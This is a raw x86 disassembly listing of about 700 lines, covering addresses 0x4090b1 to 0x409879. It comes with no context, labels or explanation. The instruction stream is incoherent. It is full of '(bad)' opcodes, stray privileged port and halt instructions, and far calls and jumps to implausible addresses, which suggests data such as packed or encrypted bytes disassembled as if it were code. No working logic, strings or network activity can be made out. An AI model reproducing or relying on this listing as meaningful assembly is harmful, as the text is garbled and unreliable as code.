  4090b1:	lods   eax,DWORD PTR ds:[esi]
  4090b2:	in     eax,dx
  4090b3:	add    esp,eax
  4090b5:	add    al,0x2
  4090b7:	and    DWORD PTR [ecx],edx
  4090b9:	ja     0x409096
  4090bb:	jns    0x40907b
  4090bd:	aam    0x7
  4090bf:	fistp  DWORD PTR [ebx+edx*4+0x79]
  4090c3:	outs   dx,DWORD PTR ds:[esi]
  4090c4:	sbb    BYTE PTR [ebp-0x56bcf7ab],0x34
  4090cb:	xchg   ebp,eax
  4090cc:	hlt    
  4090cd:	pop    DWORD PTR [edi-0x32]
  4090d0:	ret    0xbe57
  4090d3:	pop    edi
  4090d4:	add    al,0xab
  4090d6:	mov    edx,0xb55d4cda
  4090db:	cmp    eax,0x2bbe67a3
  4090e0:	push   eax
  4090e1:	cmp    al,0xe8
  4090e3:	call   0xb984cba4
  4090e8:	(bad)  
  4090e9:	das    
  4090ea:	into   
  4090eb:	fst    DWORD PTR [eax]
  4090ed:	add    dh,BYTE PTR [ecx-0x4db8334c]
  4090f3:	push   esi
  4090f5:	pop    edx
  4090f6:	mov    ebp,0xb5643680
  4090fb:	outs   dx,BYTE PTR ds:[esi]
  4090fc:	inc    BYTE PTR [ebx+0x4e68fdfd]
  409102:	call   0xb1e84ba
  409107:	cwde   
  409108:	push   edx
  409109:	aad    0x12
  40910b:	sbb    DWORD PTR [ecx+0x3],0x26
  40910f:	loopne 0x409176
  409111:	xchg   BYTE PTR [ebx],cl
  409113:	sar    DWORD PTR [edx-0x3b],1
  409116:	mov    eax,0x6545e10b
  40911b:	cs je  0x40918b
  40911e:	mov    ecx,0xc59155ee
  409123:	popf   
  409124:	adc    edx,esp
  409126:	dec    edi
  409127:	inc    eax
  409128:	push   ebx
  409129:	push   es
  40912a:	push   ecx
  40912b:	jo     0x4090be
  40912d:	xchg   esi,eax
  40912e:	xchg   esi,eax
  40912f:	test   DWORD PTR [ebp+0x12],ebx
  409132:	daa    
  409133:	mov    ?,WORD PTR [edi+0x5b]
  409136:	xchg   ebx,eax
  409137:	sar    ch,1
  409139:	mov    esp,cs
  40913b:	shr    cl,1
  40913d:	add    eax,0x6c9c19bf
  409142:	mov    BYTE PTR [ebp-0xd],al
  409145:	jne    0x4091b7
  409147:	loopne 0x40917f
  409149:	xchg   ebp,edx
  40914b:	stos   DWORD PTR es:[edi],eax
  40914c:	push   ss
  40914d:	or     DWORD PTR [esi+esi*4-0x1e],eax
  409151:	cmp    edi,DWORD PTR [ebx+ebx*8]
  409154:	shl    DWORD PTR [ecx+ebp*4],0x3f
  409158:	lods   al,BYTE PTR ds:[esi]
  409159:	mov    ecx,0x48422294
  40915e:	iret   
  40915f:	ret    0x4425
  409162:	add    BYTE PTR [ebx+esi*2],dh
  409165:	scas   eax,DWORD PTR es:[edi]
  409166:	xchg   ecx,eax
  409167:	repz test eax,0x973dbebf
  40916e:	sub    eax,DWORD PTR [ebx+0x61]
  409171:	inc    edx
  409172:	aas    
  409173:	(bad)  
  409176:	lods   al,BYTE PTR ds:[esi]
  409177:	push   ss
  409178:	mov    edx,gs
  40917a:	test   al,0x7b
  40917c:	dec    ebp
  40917d:	inc    ebp
  40917e:	rol    DWORD PTR [ecx],0x4a
  409181:	sub    BYTE PTR es:[ebp-0x1f31efeb],cl
  409188:	mov    BYTE PTR [eax],al
  40918a:	sbb    DWORD PTR ds:0xfe35b374,0x7d
  409191:	ss gs repnz push esp
  409195:	sbb    DWORD PTR [eax*4+0x28acafdf],edi
  40919c:	pop    edx
  40919d:	in     eax,dx
  40919e:	add    BYTE PTR [esi+0x4c],bl
  4091a1:	jl     0x4091d6
  4091a3:	call   0xbfff:0x658c35ff
  4091aa:	mov    ch,0x1f
  4091ac:	push   cs
  4091ad:	ins    BYTE PTR es:[edi],dx
  4091ae:	clc    
  4091af:	outs   dx,BYTE PTR ds:[esi]
  4091b0:	jmp    0x4091ed
  4091b2:	add    dl,BYTE PTR [esi]
  4091b4:	jecxz  0x40921c
  4091b6:	mov    eax,0xa28130af
  4091bb:	mov    ds:0xeb2cc7cd,eax
  4091c0:	mov    WORD PTR [ebx],fs
  4091c2:	rol    BYTE PTR [ecx-0x3b],0x82
  4091c6:	(bad)
  4091ca:	fnsave [ecx+0x64216969]
  4091d0:	and    al,0x4a
  4091d2:	push   0x48
  4091d4:	pop    esp
  4091d5:	inc    edi
  4091d6:	pop    ecx
  4091d7:	xchg   edi,eax
  4091d8:	or     DWORD PTR fs:[ebx],0x56
  4091dc:	mov    eax,0x36816041
  4091e1:	js     0x40922d
  4091e3:	mov    ch,0xbe
  4091e5:	loope  0x409239
  4091e7:	xchg   ebp,eax
  4091e8:	lahf   
  4091e9:	push   esi
  4091ea:	(bad)  
  4091eb:	outs   dx,DWORD PTR ds:[esi]
  4091ec:	inc    esp
  4091ed:	addr16 inc edx
  4091ef:	dec    esi
  4091f0:	and    ecx,esi
  4091f2:	in     al,0x48
  4091f4:	rcl    BYTE PTR ds:0xc6fdfbce,cl
  4091fa:	mov    ebp,0x8425eddc
  4091ff:	rcr    BYTE PTR [edx],1
  409201:	ss mov edi,0x33c6ea67
  409207:	mov    edx,0x46ecad2c
  40920c:	adc    al,0xd9
  40920e:	das    
  40920f:	das    
  409210:	scas   al,BYTE PTR es:[edi]
  409211:	sar    BYTE PTR [edx+0x2dbb30f3],1
  409217:	clc    
  409218:	test   DWORD PTR [eax],0xdea05ac6
  40921e:	data16 mov ch,0x36
  409221:	inc    ebx
  409222:	icebp  
  409223:	add    esi,DWORD PTR [esi+0x1d]
  409226:	jp     0x40929e
  409228:	add    edx,DWORD PTR [ebx+0x5c]
  40922b:	lods   eax,DWORD PTR ds:[esi]
  40922c:	fdivr  DWORD PTR [eax-0x55]
  40922f:	ins    DWORD PTR es:[edi],dx
  409230:	outs   dx,DWORD PTR ds:[esi]
  409231:	xor    BYTE PTR [ebp+0x436652a0],al
  409237:	aaa    
  409238:	mov    eax,ds:0x96c3ee60
  40923d:	loop   0x4092b7
  40923f:	add    dx,WORD PTR [eax]
  409242:	cli    
  409243:	or     dl,dl
  409245:	push   es
  409246:	cmp    al,ah
  409248:	lea    eax,[eiz*4-0x68134181]
  40924f:	dec    eax
  409250:	inc    esi
  409251:	mov    edx,0x82581f4e
  409256:	gs push ecx
  409258:	call   0x3bd649fd
  40925d:	ret    
  40925e:	shl    bl,0xcf
  409261:	push   ebp
  409262:	mov    eax,ds:0x7b36dfe
  409267:	mov    cl,BYTE PTR [ebp+ebx*1-0x1b]
  40926b:	xor    edx,eax
  40926d:	cli    
  40926e:	int3   
  40926f:	mov    ecx,0x71387867
  409274:	adc    eax,0x6688d0cc
  409279:	lds    esi,FWORD PTR [eax-0x1a]
  40927c:	call   0x3573:0x5bf52e78
  409283:	push   edx
  409284:	jne    0x409243
  409286:	loope  0x4092df
  409288:	xchg   ebp,eax
  409289:	out    dx,al
  40928a:	inc    eax
  40928b:	not    DWORD PTR [ebx+0x1c3fd7a1]
  409291:	xchg   esp,eax
  409292:	cmp    BYTE PTR [ebx-0x1a],ch
  409295:	cld    
  409296:	sar    BYTE PTR ds:0x81d6b9ae,1
  40929c:	or     eax,0xbc2b5ce9
  4092a1:	sub    DWORD PTR [ebx],esi
  4092a3:	(bad)  
  4092a4:	enter  0x4435,0xf9
  4092a8:	add    eax,0x889dd498
  4092ad:	in     al,0xfb
  4092af:	add    BYTE PTR [eax],dh
  4092b1:	xor    BYTE PTR [esi-0x30f4e904],bh
  4092b7:	test   al,0x5c
  4092b9:	xchg   ecx,eax
  4092ba:	inc    eax
  4092bb:	inc    ecx
  4092bc:	push   edx
  4092bd:	mov    ebx,0xc6db1c7a
  4092c2:	fiadd  WORD PTR [ebx]
  4092c4:	mov    dh,0x60
  4092c6:	pop    es
  4092c7:	xor    al,0x14
  4092c9:	mov    esi,DWORD PTR [ecx-0x6a]
  4092cc:	mov    esi,0x45748345
  4092d1:	mov    eax,0x9a50d9e
  4092d6:	shr    BYTE PTR [eax+0x4220c2d6],1
  4092dc:	add    DWORD PTR [ebx],ebp
  4092de:	jge    0x40934d
  4092e0:	lods   al,BYTE PTR ds:[esi]
  4092e1:	xor    dh,ch
  4092e3:	outs   dx,DWORD PTR ds:[esi]
  4092e4:	scas   eax,DWORD PTR es:[edi]
  4092e5:	or     al,0xd1
  4092e7:	mov    ecx,0x6e243802
  4092ec:	or     bh,BYTE PTR [edx-0x11]
  4092ef:	call   0x889f4278
  4092f4:	retf   0x58a6
  4092f7:	test   DWORD PTR [edi],ebx
  4092f9:	pushf  
  4092fa:	ficomp DWORD PTR [ebx+edx*1-0x20]
  4092fe:	jbe    0x4092e3
  409300:	lods   al,BYTE PTR ds:[esi]
  409301:	sbb    ah,bl
  409303:	mov    eax,0xe9ea728c
  409308:	mov    al,dh
  40930a:	(bad)  
  40930b:	jmp    0x3188:0xeaeb85a2
  409312:	jne    0x40937c
  409314:	shl    BYTE PTR [eax],cl
  409316:	mov    esi,0x7b9d9e34
  40931b:	cld    
  40931c:	inc    edx
  40931d:	mov    eax,ds:0xe8215c80
  409322:	add    BYTE PTR [eax],0x6c
  409325:	push   esi
  409326:	jg     0x40930b
  409328:	retf   0xe057
  40932b:	(bad)  
  40932c:	stos   BYTE PTR es:[edi],al
  40932d:	jl     0x4092f5
  40932f:	sahf   
  409330:	fcom   DWORD PTR [ebp+0x41]
  409333:	loopne 0x4093b0
  409335:	or     BYTE PTR [ebx-0x4b],0xc3
  409339:	cld    
  40933a:	fcom   DWORD PTR [eax]
  40933c:	sbb    eax,0x66e5941e
  409341:	stos   BYTE PTR es:[edi],al
  409342:	inc    eax
  409343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409344:	push   0x3
  409346:	jp     0x4092d7
  409348:	mov    ebp,0x7deff30f
  40934d:	pushf  
  40934e:	mov    dh,dl
  409350:	jecxz  0x409343
  409352:	xor    al,0x43
  409354:	xchg   ecx,eax
  409355:	mov    edi,0xbc0d04c9
  40935a:	cmp    DWORD PTR [edx-0x3b],edx
  40935d:	jg     0x40932a
  40935f:	cmp    DWORD PTR [edx+ebx*1+0x62],ebx
  409363:	mov    bh,0x22
  409365:	(bad)  
  409366:	jae    0x4093bd
  409368:	div    BYTE PTR [eax]
  40936a:	pop    es
  40936b:	jp     0x4093cc
  40936d:	aad    0xac
  40936f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409370:	pop    ds
  409371:	or     al,0x94
  409373:	ins    BYTE PTR es:[edi],dx
  409374:	mov    ebp,0x93033b
  409379:	xor    DWORD PTR [eax],ebx
  40937b:	das    
  40937c:	pop    edx
  40937d:	(bad)  
  40937e:	idiv   BYTE PTR [edx-0x7e2e5f63]
  409384:	in     al,dx
  409385:	mov    esi,DWORD PTR [esi-0x6]
  409388:	out    dx,al
  409389:	lock jmp 0xd8815a07
  40938f:	xchg   ebx,eax
  409390:	mov    edi,0xbd14371b
  409395:	outs   dx,DWORD PTR ds:[esi]
  409396:	jmp    0x4093cd
  409398:	cli    
  409399:	pop    ebx
  40939a:	daa    
  40939b:	clc    
  40939c:	adc    eax,0xfb02ec31
  4093a1:	(bad)  
  4093a2:	jmp    0x43b0266b
  4093a7:	dec    edx
  4093a8:	out    dx,al
  4093a9:	adc    edx,esp
  4093ab:	enter  0x8cb6,0x42
  4093af:	in     al,0x24
  4093b1:	push   eax
  4093b2:	in     al,dx
  4093b3:	test   eax,0xe6fccd22
  4093b8:	ret    
  4093b9:	push   ebp
  4093ba:	and    DWORD PTR [ebp+ebx*4+0x6a],0x43
  4093bf:	test   al,0x19
  4093c1:	jmp    0x3419:0x7ac28ed9
  4093c8:	out    dx,al
  4093c9:	jnp    0x409368
  4093cb:	mov    al,ds:0x22a76843
  4093d0:	retf   
  4093d1:	aad    0xad
  4093d3:	add    eax,0x266fab89
  4093d8:	jno    0x409437
  4093da:	out    dx,eax
  4093db:	ret    
  4093dc:	les    esi,FWORD PTR [esp+edi*8-0x59f3bc73]
  4093e3:	test   al,0x6
  4093e5:	cmp    al,0x6c
  4093e7:	cmp    al,0x4
  4093e9:	test   eax,0xb1be7b9
  4093ee:	xchg   edx,eax
  4093ef:	mov    bl,0x43
  4093f1:	sbb    cl,al
  4093f3:	pop    DWORD PTR [esi]
  4093f5:	push   ebx
  4093f6:	push   eax
  4093f7:	sub    al,0xaf
  4093f9:	push   0x3a
  4093fb:	pusha  
  4093fc:	push   0x599fdada
  409401:	mov    cl,BYTE PTR [eax-0x5de9a89f]
  409407:	lods   eax,DWORD PTR ds:[esi]
  409408:	sti    
  409409:	adc    BYTE PTR [ebp+0x5f141290],ah
  40940f:	or     bh,bl
  409411:	pop    esp
  409412:	mov    edi,0x201db0a2
  409417:	adc    eax,0x90938dba
  40941c:	test   eax,0x8f88ae4f
  409421:	xor    eax,0xc94630ee
  409426:	call   0x7e6c:0xddd0c379
  40942d:	mov    eax,0xc093e70e
  409432:	les    eax,FWORD PTR [edx+0x9d9817b]
  409438:	pop    edx
  409439:	scas   al,BYTE PTR es:[edi]
  40943a:	mov    bh,0xa9
  40943c:	lahf   
  40943d:	adc    eax,0x2ef1564f
  409442:	dec    edx
  409443:	add    DWORD PTR ds:0xa332f724,edx
  409449:	loopne 0x409491
  40944b:	mov    fs,WORD PTR ds:0x3c019441
  409451:	ja     0x40945c
  409453:	dec    ecx
  409454:	xlat   BYTE PTR ds:[ebx]
  409455:	rol    BYTE PTR [edx+0x5c],0xcb
  409459:	enter  0x51f3,0x8f
  40945d:	aam    0xcd
  40945f:	and    bh,BYTE PTR ds:[ebp+0x4e7face6]
  409466:	push   cs
  409467:	sti    
  409468:	or     DWORD PTR [ebx+eax*8-0x3f],0xffffff9e
  40946d:	scas   eax,DWORD PTR es:[edi]
  40946e:	ret    0xd30e
  409471:	out    dx,eax
  409472:	push   edi
  409473:	xlat   BYTE PTR ds:[ebx]
  409474:	mov    bh,0x65
  409476:	inc    ebp
  409477:	pop    eax
  409478:	dec    esp
  409479:	in     eax,dx
  40947a:	lock rcl DWORD PTR ds:0x1855313e,cl
  409481:	scas   al,BYTE PTR es:[edi]
  409482:	push   eax
  409483:	data16 or dh,bh
  409486:	(bad)  
  409488:	(bad)  
  409489:	sahf   
  40948a:	lods   eax,DWORD PTR ds:[esi]
  40948b:	ret    0x86ac
  40948e:	test   DWORD PTR [ecx],esi
  409490:	jbe    0x4094a9
  409492:	les    eax,FWORD PTR [edi]
  409494:	ins    BYTE PTR es:[edi],dx
  409495:	mov    ebx,0xed301087
  40949a:	in     eax,dx
  40949b:	ja     0x409461
  40949d:	shr    BYTE PTR [ebp-0x4cf3c2ef],1
  4094a3:	push   esi
  4094a4:	jecxz  0x40950d
  4094a6:	outs   dx,DWORD PTR ds:[esi]
  4094a7:	lock jns 0x409528
  4094aa:	fs jae 0x40944d
  4094ad:	mov    dl,dh
  4094af:	and    BYTE PTR [ebx+0x44],0xd5
  4094b3:	mov    cl,ah
  4094b5:	and    ah,BYTE PTR [edi+edi*2+0x3348f3f9]
  4094bc:	hlt    
  4094bd:	sbb    esp,DWORD PTR [ebx]
  4094bf:	xchg   ecx,eax
  4094c0:	popa   
  4094c1:	push   edx
  4094c2:	test   al,0x17
  4094c4:	js     0x40946d
  4094c6:	ret    
  4094c7:	jl     0x409504
  4094c9:	ret    0xb034
  4094cc:	mov    ah,0xbe
  4094ce:	dec    esi
  4094cf:	sbb    bl,ch
  4094d1:	cli    
  4094d2:	mov    esp,0x945f90c9
  4094d7:	sub    eax,0xba747524
  4094dc:	xchg   ecx,eax
  4094dd:	inc    edi
  4094de:	setl   BYTE PTR [eax+eiz*4+0x6d]
  4094e3:	into   
  4094e4:	ret    
  4094e5:	jnp    0x4094ce
  4094e7:	or     al,0x97
  4094e9:	pop    edx
  4094ea:	fld    QWORD PTR [edx-0x47]
  4094ed:	enter  0x1697,0x2a
  4094f1:	pop    eax
  4094f2:	mov    ebp,0x6416baa0
  4094f7:	jnp    0x409523
  4094f9:	jns    0x409506
  4094fb:	(bad)  
  4094fc:	in     eax,dx
  4094fd:	cmp    ah,BYTE PTR [ecx+0x4738ccac]
  409503:	imul   edx,DWORD PTR [ebp+0x3aa959d1],0x25
  40950a:	mov    edi,0x7aaa9e
  40950f:	inc    esi
  409510:	fiadd  DWORD PTR [ebx+0x4e]
  409513:	test   dl,al
  409515:	repnz dec esi
  409517:	sbb    al,0x52
  409519:	loopne 0x409543
  40951b:	scas   eax,DWORD PTR es:[edi]
  40951c:	adc    eax,0xd30001e1
  409521:	mov    esp,0x5be96e9f
  409526:	imul   esi,DWORD PTR [edx+ebx*2],0x200c500a
  40952d:	aaa    
  40952e:	mov    BYTE PTR [edx-0x63130498],ah
  409534:	test   DWORD PTR [edx-0x69b3a6fa],ebx
  40953a:	jmp    0xe43c1bee
  40953f:	nop
  409540:	or     al,0x1f
  409542:	pusha  
  409543:	imul   esi,DWORD PTR [ebp-0x71],0x7dae3fe5
  40954a:	and    dl,BYTE PTR [esi+edi*1-0x3a]
  40954e:	dec    edi
  40954f:	mov    al,dl
  409551:	xor    eax,DWORD PTR [esi-0x197f8015]
  409557:	add    BYTE PTR [ebp+0x339e5f1e],dl
  40955d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40955e:	and    bh,cl
  409560:	hlt    
  409561:	add    ebx,0x70
  409564:	mov    edx,0x8a6401f2
  409569:	jecxz  0x40951d
  40956b:	ins    DWORD PTR es:[edi],dx
  40956c:	inc    eax
  40956d:	fsub   DWORD PTR [ebp+0x1e]
  409570:	and    BYTE PTR [esi],0x4f
  409573:	and    BYTE PTR [ebx],0x9c
  409576:	and    BYTE PTR [ebp-0x4b76b3b5],ah
  40957c:	in     eax,0x6e
  40957e:	bound  esp,QWORD PTR [ebx]
  409580:	retf   
  409581:	shr    DWORD PTR [ecx],1
  409583:	loopne 0x4095b9
  409585:	pop    edi
  409586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409587:	fisub  WORD PTR [edi+0x3d]
  40958a:	xchg   edx,eax
  40958b:	mov    cl,0x43
  40958d:	inc    esp
  40958e:	jno    0x4095d5
  409590:	cmp    DWORD PTR [ebp+0x70910f84],ebp
  409596:	stos   DWORD PTR es:[edi],eax
  409597:	or     al,0x5f
  409599:	pop    es
  40959a:	and    DWORD PTR [edx+0x5cbbebfa],ecx
  4095a0:	ja     0x4095e5
  4095a2:	mov    dh,0xf0
  4095a4:	jbe    0x40958c
  4095a6:	loope  0x40959d
  4095a8:	dec    ebx
  4095a9:	imul   ecx,DWORD PTR [ecx+0x29],0x53c88dec
  4095b0:	push   esp
  4095b1:	jmp    0xa111:0x3caf6089
  4095b8:	jmp    0x476671eb
  4095bd:	fild   WORD PTR [ebx]
  4095bf:	into   
  4095c0:	scas   al,BYTE PTR es:[edi]
  4095c1:	xor    eax,0x6b66a40f
  4095c6:	fbstp  TBYTE PTR [esi-0x73]
  4095c9:	pop    ecx
  4095ca:	test   DWORD PTR [ebx-0x1afbcffc],esp
  4095d0:	imul   ebx,DWORD PTR [ebp-0x3793d59b],0xffffffe2
  4095d7:	iret   
  4095d8:	outs   dx,BYTE PTR ds:[esi]
  4095d9:	xor    edi,esp
  4095db:	xor    DWORD PTR [esi-0x6d417474],edi
  4095e1:	fwait
  4095e2:	(bad)  
  4095e3:	adc    al,0xb8
  4095e5:	pop    ebx
  4095e6:	outs   dx,BYTE PTR ds:[esi]
  4095e7:	mov    ah,0x44
  4095e9:	and    DWORD PTR [edi],esi
  4095eb:	adc    bl,BYTE PTR [esi+edi*1]
  4095ee:	push   esi
  4095ef:	cmp    edx,eax
  4095f1:	add    al,0xc4
  4095f3:	rcr    DWORD PTR [edx-0x48ee020f],1
  4095f9:	loopne 0x4095f4
  4095fb:	jmp    0x77ea:0x5206c4d0
  409602:	jmp    0x601:0x9f9a6dae
  409609:	rcr    DWORD PTR [eax+0x42],cl
  40960c:	loopne 0x409643
  40960e:	sbb    eax,0xb1ae4ac6
  409613:	adc    cl,ah
  409615:	loope  0x409631
  409617:	repnz inc ecx
  409619:	aad    0x4f
  40961b:	cmp    eax,0xebad685a
  409620:	mov    dh,0x39
  409622:	xchg   ecx,eax
  409623:	cmp    eax,0x392676d
  409628:	bound  esp,QWORD PTR [ecx-0x63bdb443]
  40962e:	jns    0x4095d2
  409630:	add    al,BYTE PTR [esi]
  409632:	scas   al,BYTE PTR es:[edi]
  409633:	jns    0x409678
  409635:	mov    al,ds:0x61d915c1
  40963a:	push   0x19
  40963c:	or     edx,ebx
  40963e:	mov    al,0x1a
  409640:	cmp    ecx,DWORD PTR [esi-0x59]
  409643:	cdq    
  409644:	dec    esi
  409645:	pop    esp
  409646:	popf   
  409647:	aaa    
  409648:	scas   eax,DWORD PTR es:[edi]
  409649:	inc    esi
  40964a:	push   0x5e8f09f9
  40964f:	das    
  409650:	aad    0x1f
  409652:	retf   0x79f7
  409655:	(bad)  
  409656:	jl     0x409616
  409658:	sbb    cl,dl
  40965a:	adc    eax,0xbeba7d27
  40965f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409660:	xor    edx,DWORD PTR [ebx]
  409662:	aad    0x26
  409664:	cmp    BYTE PTR [eax-0x54],ch
  409667:	lods   al,BYTE PTR ds:[esi]
  409668:	jbe    0x409631
  40966a:	lock inc esp
  40966c:	push   edi
  40966d:	dec    ecx
  40966e:	fsubr  st,st(2)
  409670:	dec    edi
  409671:	arpl   WORD PTR [ebp-0x49],ax
  409674:	sub    dh,al
  409676:	or     ebx,edi
  409678:	push   ds
  409679:	mov    eax,0x90c203c
  40967e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40967f:	loopne 0x409644
  409681:	stc    
  409682:	retf   0xe35d
  409685:	sub    ebx,DWORD PTR [ecx]
  409687:	icebp  
  409688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409689:	add    eax,0x1cd4db1
  40968e:	jo     0x409648
  409690:	xchg   edx,eax
  409691:	fs aas 
  409693:	xor    al,dh
  409695:	bound  ebx,QWORD PTR [edx+0x46d2fad]
  40969b:	daa    
  40969c:	fdivr  DWORD PTR [ebx-0x43]
  40969f:	shr    DWORD PTR [edi-0xc],1
  4096a2:	jno    0x409694
  4096a4:	cmp    al,0x44
  4096a6:	adc    eax,0x24e604c0
  4096ab:	shl    BYTE PTR [ebp+0x6e],1
  4096ae:	adc    dl,BYTE PTR [edi-0x1]
  4096b1:	jno    0x409699
  4096b3:	xchg   ebp,eax
  4096b4:	or     bl,BYTE PTR [ebx]
  4096b6:	(bad)  
  4096b7:	adc    ebp,ebp
  4096b9:	xchg   esp,eax
  4096ba:	add    BYTE PTR [eax-0x2a],ah
  4096bd:	jle    0x409666
  4096bf:	sbb    BYTE PTR [ebx+0x25f970a4],bl
  4096c5:	sub    cl,BYTE PTR [esi-0x334d4b5]
  4096cb:	mov    edi,0xfa39b1ee
  4096d0:	dec    edx
  4096d1:	ss xor al,0xcf
  4096d4:	int    0x30
  4096d6:	sbb    bl,BYTE PTR [ebx+0x35]
  4096d9:	not    DWORD PTR [edx]
  4096db:	adc    BYTE PTR [ebp+0x55],0xcb
  4096df:	pop    ebp
  4096e0:	test   BYTE PTR [ebp-0x1b],ch
  4096e3:	mov    bl,0xb8
  4096e5:	icebp  
  4096e6:	scas   eax,DWORD PTR es:[edi]
  4096e7:	push   0x24
  4096e9:	mov    ecx,0x3a3afe76
  4096ee:	inc    edx
  4096ef:	and    bl,BYTE PTR [edi-0x455ca831]
  4096f5:	dec    ebp
  4096f6:	cmp    esp,DWORD PTR ds:0xde2c536e
  4096fc:	data16 or BYTE PTR [ebx],bl
  4096ff:	test   DWORD PTR [ecx-0x6080d1fd],esi
  409705:	jnp    0x40969a
  409707:	pmuludq mm6,QWORD PTR [esp+edi*4]
  40970b:	xchg   ebx,eax
  40970c:	loopne 0x4096b5
  40970e:	xchg   esp,eax
  40970f:	lds    ebp,FWORD PTR [ecx+0x404b77e0]
  409715:	ds test ch,al
  409718:	xor    eax,0x758f832c
  40971d:	stos   BYTE PTR es:[edi],al
  40971e:	sub    BYTE PTR [esp+eiz*2+0x1de0dc75],ch
  409725:	xchg   esi,eax
  409726:	mov    edi,0x9ca0708e
  40972b:	mov    dh,0x42
  40972d:	retf   
  40972e:	dec    ecx
  40972f:	and    bh,ah
  409731:	sbb    DWORD PTR [ebx+edi*1+0x64],esi
  409735:	push   edi
  409736:	idiv   DWORD PTR [esi-0x2d]
  409739:	(bad)  
  40973a:	call   0x5ba:0x588e3b90
  409741:	sub    ebx,DWORD PTR [edi-0xa]
  409744:	sar    DWORD PTR [edx],0x47
  409747:	sbb    esi,0xffffffc0
  40974a:	inc    BYTE PTR [edi-0x54]
  40974d:	and    BYTE PTR [edi+0x42],ch
  409750:	mov    bh,0x9d
  409752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409753:	pop    ecx
  409754:	jmp    0x1434:0xe4e4096c
  40975b:	sub    eax,0xc8fe5f8
  409760:	mov    edx,DWORD PTR [esi-0x7e5d284d]
  409766:	push   0xefcdf6da
  40976b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40976c:	xchg   esi,eax
  40976d:	mov    bh,0x4f
  40976f:	inc    ecx
  409770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409771:	xchg   edx,edx
  409773:	xor    cl,BYTE PTR [esi-0x49]
  409776:	add    ebx,DWORD PTR [ecx+ecx*4+0x69d0a7f2]
  40977d:	fbld   TBYTE PTR [ecx-0x58]
  409780:	jno    0x40975f
  409782:	adc    DWORD PTR [ebx],ecx
  409784:	adc    eax,0xbb5e4198
  409789:	stos   BYTE PTR es:[edi],al
  40978a:	pop    ecx
  40978b:	dec    edx
  40978c:	xchg   edx,eax
  40978d:	or     ebx,DWORD PTR [ebx+0x42]
  409790:	(bad)  
  409791:	mul    BYTE PTR [esi+0x633727a7]
  409797:	(bad)  
  409798:	ficom  WORD PTR [esi+0x6e]
  40979b:	std    
  40979c:	shl    bl,0x9d
  40979f:	mov    cl,0xd1
  4097a1:	ja     0x409797
  4097a3:	pop    esi
  4097a4:	xchg   edx,eax
  4097a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097a6:	cmp    ebp,DWORD PTR [edi-0xb]
  4097a9:	jae    0x409736
  4097ab:	push   0xffffff91
  4097ad:	popf   
  4097ae:	mov    eax,ds:0xb404bd40
  4097b3:	sub    edx,DWORD PTR [esi]
  4097b5:	add    ch,BYTE PTR [edi]
  4097b7:	mov    bl,0xc6
  4097b9:	ins    BYTE PTR es:[edi],dx
  4097ba:	clc    
  4097bb:	pop    edi
  4097bc:	push   edi
  4097bd:	shl    BYTE PTR [edx-0x2e],1
  4097c0:	scas   eax,DWORD PTR es:[edi]
  4097c1:	ret    0x78ea
  4097c4:	push   ecx
  4097c5:	jo     0x4097f5
  4097c7:	(bad)  
  4097c8:	hlt    
  4097c9:	std    
  4097ca:	cmp    ah,ch
  4097cc:	outs   dx,BYTE PTR ds:[esi]
  4097cd:	pop    eax
  4097ce:	jb     0x4097c5
  4097d0:	scas   al,BYTE PTR es:[edi]
  4097d1:	cmp    al,0xf6
  4097d3:	push   cs
  4097d4:	loope  0x4097f9
  4097d6:	xor    cl,bl
  4097d8:	sub    al,0x29
  4097da:	popa   
  4097db:	xchg   edi,eax
  4097dc:	xlat   BYTE PTR ds:[ebx]
  4097dd:	push   edi
  4097de:	push   ds
  4097df:	xchg   ebx,eax
  4097e0:	fstp   TBYTE PTR [edx-0x530fb7f]
  4097e6:	(bad)  
  4097e7:	push   0xffffff85
  4097e9:	jp     0x409817
  4097eb:	fsubr  QWORD PTR ds:0x1fac5dbb
  4097f1:	xchg   ebp,eax
  4097f2:	inc    ebx
  4097f3:	fwait
  4097f4:	xchg   ebp,eax
  4097f5:	sbb    ebx,esp
  4097f7:	push   ss
  4097f8:	pop    ebp
  4097f9:	mov    ah,0xd
  4097fb:	and    BYTE PTR [edx],0x53
  4097fe:	rol    BYTE PTR [edi+0x5ba7ae71],0x48
  409805:	push   ebx
  409806:	or     edx,DWORD PTR [eax-0x2b]
  409809:	arpl   WORD PTR [eax+0x35],ax
  40980c:	cmp    al,dh
  40980e:	gs dec ebp
  409810:	scas   eax,DWORD PTR es:[edi]
  409811:	pop    esi
  409812:	mov    cs,WORD PTR [ebx+edi*4-0x7456d694]
  409819:	mov    al,ds:0x7c7ca45b
  40981e:	add    al,0x18
  409820:	xchg   esi,eax
  409821:	inc    ebp
  409822:	dec    ebp
  409823:	aam    0x7d
  409825:	sub    dh,BYTE PTR [esi+0x76]
  409828:	out    dx,eax
  409829:	out    dx,al
  40982a:	sub    DWORD PTR [ebp+0x20],edx
  40982d:	xchg   ebp,eax
  40982e:	mov    bh,0x3e
  409830:	add    al,0x2
  409832:	mov    ebx,0x856274ad
  409838:	fmul   DWORD PTR [ebx+0x32]
  40983b:	shr    BYTE PTR ds:0x86ec77f7,0x5f
  409842:	nop
  409843:	push   esp
  409844:	pop    eax
  409845:	jmp    0x6a430f52
  40984a:	mov    bh,0xae
  40984c:	push   eax
  40984d:	frstor [ebx+0x72]
  409850:	test   eax,0xef52296a
  409855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409856:	ret    
  409857:	add    ah,BYTE PTR [ecx-0x2022168a]
  40985d:	repz jmp DWORD PTR [ebp+0x797e36d5]
  409864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409865:	add    dl,BYTE PTR [esi]
  409867:	xchg   cl,dl
  409869:	xor    eax,0xe4536097
  40986e:	sbb    al,0xee
  409870:	cmp    BYTE PTR [ebx+0x1325b8e5],cl
  409876:	sbb    al,0x77
  409878:	sti    
  409879:	(bad)  
